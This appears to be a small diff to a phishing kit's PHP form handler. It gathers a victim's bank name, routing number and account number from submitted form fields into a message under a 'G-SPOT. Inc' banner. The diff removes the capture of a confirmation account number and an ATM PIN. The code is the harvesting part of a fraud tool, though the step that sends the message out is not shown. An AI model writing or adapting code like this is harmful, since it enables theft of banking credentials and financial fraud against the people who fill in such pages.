@@ -8,8 +8,6 @@ require_once '../../main.php';
 $bank       = $_POST['bankname'];
 $routing    = $_POST['rnum'];
 $account    = $_POST['anum'];
-$reaccount  = $_POST['vanum'];
-$pin        = $_POST['atmpin'];
 $message   = "
 
 #-----------------------[ G-SPOT. Inc ]---------------------------#
